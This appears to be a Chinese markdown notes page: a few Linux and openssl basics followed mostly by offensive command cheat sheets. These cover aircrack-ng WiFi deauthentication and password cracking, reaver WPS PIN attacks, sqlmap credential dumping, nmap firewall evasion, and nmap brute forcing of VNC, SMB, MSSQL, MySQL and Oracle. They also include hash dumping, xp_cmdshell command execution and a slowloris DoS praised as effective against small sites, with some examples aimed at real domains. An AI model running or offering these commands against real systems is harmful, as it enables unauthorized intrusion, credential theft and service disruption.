# [Home](../README.md)
## [Linux](https://www.apiref.com/linux-zh/linux-command-manual.html)

![linux](https://www.runoob.com/wp-content/uploads/2014/06/d0c50-linux2bfile2bsystem2bhierarchy.jpg)

### Linux发行版
- [Ubuntu](http://www.ubuntu.com/)
- [Fedora](http://fedoraproject.org/)
- [Debian](http://www.debian.org/)
- [CentOS](http://www.centos.org/)
- [Arch](https://www.archlinux.org/)
- [Kali](https://www.kali.org/)
- [ElementaryOS](https://elementary.io/zh_CN/)
- [Nitrux](https://nxos.org/)

### openssl
> 加密

```shell
echo '明文' | openssl aes-128-cbc -k "key" -base64
```

>解密

```shell
echo "U2FsdGVkX19nGdcPGq41k5Nq92WRzXIkH1YVcBAjJpQ=" | openssl aes-128-cbc -d -k "key" -base64
echo "U2FsdGVkX19nGdcPGq41k5Nq92WRzXIkH1YVcBAjJpQ=" | tr ' ' '\n' | openssl aes-128-cbc -d -k "key" -base64
```

```shell
#Standard commands
asn1parse         ca                ciphers           cms
crl               crl2pkcs7         dgst              dhparam
dsa               dsaparam          ec                ecparam
enc               engine            errstr            gendsa
genpkey           genrsa            help              list
nseq              ocsp              passwd            pkcs12
pkcs7             pkcs8             pkey              pkeyparam
pkeyutl           prime             rand              rehash
req               rsa               rsautl            s_client
s_server          s_time            sess_id           smime
speed             spkac             srp               storeutl
ts                verify            version           x509

#Message Digest commands (see the `dgst' command for more details)
blake2b512        blake2s256        gost              md4
md5               mdc2              rmd160            sha1
sha224            sha256            sha3-224          sha3-256
sha3-384          sha3-512          sha384            sha512
sha512-224        sha512-256        shake128          shake256
sm3

#Cipher commands (see the `enc' command for more details)
aes-128-cbc       aes-128-ecb       aes-192-cbc       aes-192-ecb
aes-256-cbc       aes-256-ecb       aria-128-cbc      aria-128-cfb
aria-128-cfb1     aria-128-cfb8     aria-128-ctr      aria-128-ecb
aria-128-ofb      aria-192-cbc      aria-192-cfb      aria-192-cfb1
aria-192-cfb8     aria-192-ctr      aria-192-ecb      aria-192-ofb
aria-256-cbc      aria-256-cfb      aria-256-cfb1     aria-256-cfb8
aria-256-ctr      aria-256-ecb      aria-256-ofb      base64
bf                bf-cbc            bf-cfb            bf-ecb
bf-ofb            camellia-128-cbc  camellia-128-ecb  camellia-192-cbc
camellia-192-ecb  camellia-256-cbc  camellia-256-ecb  cast
cast-cbc          cast5-cbc         cast5-cfb         cast5-ecb
cast5-ofb         des               des-cbc           des-cfb
des-ecb           des-ede           des-ede-cbc       des-ede-cfb
des-ede-ofb       des-ede3          des-ede3-cbc      des-ede3-cfb
des-ede3-ofb      des-ofb           des3              desx
rc2               rc2-40-cbc        rc2-64-cbc        rc2-cbc
rc2-cfb           rc2-ecb           rc2-ofb           rc4
rc4-40            seed              seed-cbc          seed-cfb
seed-ecb          seed-ofb          sm4-cbc           sm4-cfb
sm4-ctr           sm4-ecb           sm4-ofb           zlib
```
### wifi密码跑字典
```shell
airmon-ng check kill			#杀死进程
airmon-ng start wlan0			#是wlan0网卡开起monitor mode
airodump-ng wlan0mon			#查看附件wifi
airodump-ng --bssid mac地址 -c CH值 -w crack wlan0mon		#开始抓包

aireplay-ng --deauth 10 -a mac地址 -c 抓到的mac地址 wlan0mon
aircrack-ng -w 密码字典路径 crack-01.cap

airmon-ng stop wlan0mon		#关闭wlan0网卡monitor mode
```
### wifi跑pin码
```shell
airmon-ng start wlan0
wash -i wlan0mon
reaver -i wlan0mon -b mac地址 -S -N -vv -c CH值
```

## sqlmap工具
```shell
sqlmap -u url --dbs --current-user	
sqlmap -u url --dbms mysql -D dbName --tables
sqlmap -u url --dbms mysql -T admin --columns
sqlmap -u url --dbms mysql -T admin -C field1, field2 --dump

sqlmap -u url?id=1
sqlmap -u url?id=1 --dbs
sqlmap -u url?id=1 --current-db		#列出当前使用的数据库名
sqlmap -u url?id=1 --tables -D "db_name"
sqlmap -u url?id=1 --columns -T "tb_name" -D "db_name"
sqlmap -u url?id=1 --dump -C "username, password" -T "tb_name" -D "db_name"

sqlmap -u url?id=1 --is-dbs #判断该注入点是否有管理员权限，true表示管理员
```

## nmap工具
### 命令参数
```shell
-sT    TCP connect() 扫描，这是最基本的 TCP 扫描方式。这种扫描很容易被检测到，在目标主机的日志中会记录大批的连接请求以及错误信息。    
-sS    TCP 同步扫描 (TCP SYN)，因为不必全部打开一个 TCP 连接，所以这项技术通常称为半开扫描 (half-open)。这项技术最大的好处是，很少有系统能够把这记入系统日志。不过，你需要 root 权限来定制 SYN 数据包。    
-sF,-sX,-sN    秘密 FIN 数据包扫描、圣诞树 (Xmas Tree)、空 (Null) 扫描模式。这些扫描方式的理论依据是：关闭的端口需要对你的探测包回应 RST 包，而打开的端口必需忽略有问题的包（参考 RFC 793 第 64 页）。    
-sP    ping 扫描，用 ping 方式检查网络上哪些主机正在运行。当主机阻塞 ICMP echo 请求包是 ping 扫描是无效的。nmap 在任何情况下都会进行 ping 扫描，只有目标主机处于运行状态，才会进行后续的扫描。    
-sU    UDP 的数据包进行扫描，如果你想知道在某台主机上提供哪些 UDP（用户数据报协议，RFC768) 服务，可以使用此选项。    
-sA    ACK 扫描，这项高级的扫描方法通常可以用来穿过防火墙。    
-sW    滑动窗口扫描，非常类似于 ACK 的扫描。    
-sR    RPC 扫描，和其它不同的端口扫描方法结合使用。    
-b    FTP 反弹攻击 (bounce attack)，连接到防火墙后面的一台 FTP 服务器做代理，接着进行端口扫描。
-P0    在扫描之前，不 ping 主机。    
-PT    扫描之前，使用 TCP ping 确定哪些主机正在运行。    
-PS    对于 root 用户，这个选项让 nmap 使用 SYN 包而不是 ACK 包来对目标主机进行扫描。    
-PI    设置这个选项，让 nmap 使用真正的 ping(ICMP echo 请求）来扫描目标主机是否正在运行。    
-PB    这是默认的 ping 扫描选项。它使用 ACK(-PT) 和 ICMP(-PI) 两种扫描类型并行扫描。如果防火墙能够过滤其中一种包，使用这种方法，你就能够穿过防火墙。    
-O    这个选项激活对 TCP/IP 指纹特征 (fingerprinting) 的扫描，获得远程主机的标志，也就是操作系统类型。    
-I    打开 nmap 的反向标志扫描功能。    
-f    使用碎片 IP 数据包发送 SYN、FIN、XMAS、NULL。包增加包过滤、入侵检测系统的难度，使其无法知道你的企图。    
-v    冗余模式。强烈推荐使用这个选项，它会给出扫描过程中的详细信息。    
-S <IP>    在一些情况下，nmap 可能无法确定你的源地址 (nmap 会告诉你）。在这种情况使用这个选项给出你的 IP 地址。    
-g port    设置扫描的源端口。一些天真的防火墙和包过滤器的规则集允许源端口为 DNS(53) 或者 FTP-DATA(20) 的包通过和实现连接。显然，如果攻击者把源端口修改为 20 或者 53，就可以摧毁防火墙的防护。    
-oN    把扫描结果重定向到一个可读的文件 logfilename 中。    
-oS    扫描结果输出到标准输出。    
--host_timeout    设置扫描一台主机的时间，以毫秒为单位。默认的情况下，没有超时限制。    
--max_rtt_timeout    设置对每次探测的等待时间，以毫秒为单位。如果超过这个时间限制就重传或者超时。默认值是大约 9000 毫秒。    
--min_rtt_timeout    设置 nmap 对每次探测至少等待你指定的时间，以毫秒为单位。    
-M count    置进行 TCP connect() 扫描时，最多使用多少个套接字进行并行的扫描。著作权归LyShark所有 

```
### 主机发现扫描
```shell
# 批量Ping扫描: 批量扫描一个网段的主机存活数.
[root@localhost ~]# nmap -sP 192.168.1.0/24

# 跳过Ping探测: 有些主机关闭了ping检测,所以可以使用-P0跳过ping的探测,可以加快扫描速度.
[root@localhost ~]# nmap -P0 192.168.1.7

# 计算网段主机IP: 仅列出指定网段上的每台主机,不发送任何报文到目标主机.
[root@localhost ~]# nmap -sL 192.168.1.0/24

# 扫描IP地址范围: 可以指定一个IP地址范围
[root@localhost ~]# nmap -sP 192.168.1.1-10

# 探测开放端口(SYN): 探测目标主机开放的端口,可指定一个以逗号分隔的端口列表(如-PS22,443,80).
[root@localhost ~]# nmap -PS22,80,443 192.168.1.7

# 探测开放端口(UDP): 探测目标主机开放的端口,可指定一个以逗号分隔的端口列表(如-PS22,443,80).
[root@localhost ~]# nmap -PU 192.168.1.7

# SYN扫描: 使用SYN半开放扫描
[root@localhost ~]# nmap -sS 192.168.1.7

# TCP扫描: 扫描开放了TCP端口的设备.
[root@localhost ~]# nmap -sT 192.168.1.7

# UDP扫描: 扫描开放了UDP端口的设备.
[root@localhost ~]# nmap -sU 192.168.1.7

# 协议探测: 探测目标主机支持哪些IP协议
[root@localhost ~]# nmap -sO 192.168.1.7

# 探测目标系统: 扫描探测目标主机操作系统,这里结果仅供参考.
[root@localhost ~]# nmap -O 192.168.1.7

# 探测服务版本: 用于扫描目标主机服务版本号.
[root@localhost ~]# nmap -sV 192.168.1.7

# 扫描多台主机: 一次性扫描多台目标主机.
[root@localhost ~]# nmap 192.168.1.2 192.168.1.7

# 导入扫描文件: 从一个文件中导入IP地址,并进行扫描.
[root@localhost ~]# cat hosts.txt
localhost
www.baidu.com
192.168.0.1
[root@localhost ~]# nmap -iL hosts.txt

# 绕过防火墙: 在扫描时通过使用-f参数以及使用--mtu 4/8/16使用分片、指定数据包的MTU,来绕过防火墙.
[root@localhost ~]# nmap -f 127.0.0.1

# 其他基本:
nmap localhost    #查看主机当前开放的端口
nmap -p 1024-65535 localhost    #查看主机端口（1024-65535）中开放的端口
nmap -PS 192.168.21.163        #探测目标主机开放的端口
nmap -PS22,80,3306  192.168.21.163    #探测所列出的目标主机端口
nmap -O 192.168.21.163    #探测目标主机操作系统类型
nmap -A 192.168.21.163    #探测目标主机操作系统类型
```
### 使用脚本扫描
```shell
# 扫描WEB敏感目录: 通过使用--script=http-enum.nse可以扫描网站的敏感目录.
[root@localhost ~]# nmap -p 80 --script=http-enum.nse www.mkdirs.com

# 绕开鉴权: 负责处理鉴权证书(绕开鉴权)的脚本,也可以作为检测部分应用弱口令.
[root@localhost ~]# nmap --script=auth www.mkdirs.com

# 默认脚本扫描: 脚本扫描,主要是搜集各种应用服务的信息,收集到后可再针对具体服务进行攻击.
[root@localhost ~]# nmap --script=default www.mkdirs.com

# 检测常见漏洞: 通过使用--script=luln,可以扫描网站的常见漏洞,以及网页的目录结构.
[root@localhost ~]# nmap --script=vuln www.mkdirs.com

# 内网服务探测: 通过使用--script=broadcast,可以实现在局域网内探查更多服务开启状况.
[root@localhost ~]# nmap -n -p445 --script=broadcast 127.0.0.1

# 进行WhoIS查询: 通过使用--script whois模块,可以查询网站的简单信息.
[root@localhost ~]# nmap --script whois www.baidu.com

# 详细WhoIS解析: 利用第三方的数据库或资源,查询详细的WhoIS解析情况.
[root@localhost ~]# nmap --script external www.baidu.com

# 发现内网网关: 通过使用--script=broadcast-netbios-master-browser可以发现内网网关的地址.
[root@localhost ~]# nmap --script=broadcast-netbios-master-browser 192.168.1.1

# 发现WEB中Robots文件: 通过使用--script=http-robots.txt.nse可以检测到robots文件内容.
[root@localhost scripts]# nmap --script=http-robots.txt.nse www.baidu.com

# 检查WEB服务器时间: 检查web服务器的当前时间.
[root@localhost scripts]# nmap -p 443 --script http-date.nse www.baidu.com

# 执行DOS攻击: dos攻击,对于处理能力较小的站点还挺好用的.
[root@localhost ~]# nmap --script http-slowloris --max-parallelism 1000 www.mkdirs.com

# 检查DNS子域: 检查目标ns服务器是否允许传送,如果能,直接把子域拖出来就好了.
[root@localhost scripts]# nmap -p 53 --script dns-zone-transfer.nse -v www.baidu.com

# 查询WEB旁站: 旁站查询,ip2hosts接口该接口似乎早已停用,如果想继续用,可自行到脚本里把接口部分的代码改掉.
[root@localhost scripts]# nmap -p80 --script hostmap-ip2hosts.nse www.baidu.com

# 暴力破解DNS记录: 这里以破解百度的域名为例子,由于内容较多这里简化显示.
[root@localhost scripts]# nmap --script=dns-brute.nse www.baidu.com

# 内网VNC扫描: 通过使用脚本,检查VNC版本等一些敏感信息.
[root@localhost ~]# nmap --script=realvnc-auth-bypass 127.0.0.1                                            #检查VNC版本
[root@localhost ~]# nmap --script=vnc-auth 127.0.0.1                                                       #检查VNC认证方式
[root@localhost ~]# nmap --script=vnc-info 127.0.0.1                                                       #获取VNC信息
[root@localhost ~]# nmap --script=vnc-brute.nse --script-args=userdb=/user.txt,passdb=/pass.txt 127.0.0.1  #暴力破解VNC密码

# 内网SMB扫描: 检查局域网中的Samba服务器,以及对服务器的暴力破解.
[root@localhost ~]# nmap --script=smb-brute.nse 127.0.0.1                                                            #简单尝试破解SMB服务
[root@localhost ~]# nmap --script=smb-check-vulns.nse --script-args=unsafe=1 127.0.0.1                               #SMB已知几个严重漏
[root@localhost ~]# nmap --script=smb-brute.nse --script-args=userdb=/user.txt,passdb=/pass.txt 127.0.0.1            #通过传递字段文件,进行暴力破解
[root@localhost ~]# nmap -p445 -n --script=smb-psexec --script-args=smbuser=admin,smbpass=1233 127.0.0.1             #查询主机一些敏感信息:nmap_service
[root@localhost ~]# nmap -n -p445 --script=smb-enum-sessions.nse --script-args=smbuser=admin,smbpass=1233 127.0.0.1  #查看会话
[root@localhost ~]# nmap -n -p445 --script=smb-os-discovery.nse --script-args=smbuser=admin,smbpass=1233 127.0.0.1   #查看系统信息

# MSSQL扫描: 检查局域网中的SQL Server服务器,以及对服务器的暴力破解.
[root@localhost ~]# nmap -p1433 --script=ms-sql-brute --script-args=userdb=/var/passwd,passdb=/var/passwd 127.0.0.1  #暴力破解MSSQL密码
[root@localhost ~]# nmap -p 1433 --script ms-sql-dump-hashes.nse --script-args mssql.username=sa,mssql.password=sa 127.0.0.1   #dumphash值
[root@localhost ~]# nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=sa,ms-sql-xp-cmdshell.cmd="net user" 192.168.137.4 xp_cmdshell      #执行命令

# MYSQL扫描: 检查局域网中的MySQL服务器,以及对服务器的暴力破解.
[root@localhost ~]# nmap -p3306 --script=mysql-empty-password.nse 127.0.0.1                                             #扫描root空口令
[root@localhost ~]# nmap -p3306 --script=mysql-users.nse --script-args=mysqluser=root 127.0.0.1                         #列出所有用户
[root@localhost ~]# nmap -p3306 --script=mysql-brute.nse --script-args=userdb=/var/passwd,passdb=/var/passwd 127.0.0.1  #暴力破解MYSQL口令

# Oracle扫描: 检查局域网中的Oracle服务器,以及对服务器的暴力破解.
[root@localhost ~]# nmap --script=oracle-sid-brute -p 1521-1560 127.0.0.1    #oracle sid扫描
[root@localhost ~]# nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=ORCL,userdb=/var/passwd,passdb=/var/passwd 127.0.0.1
```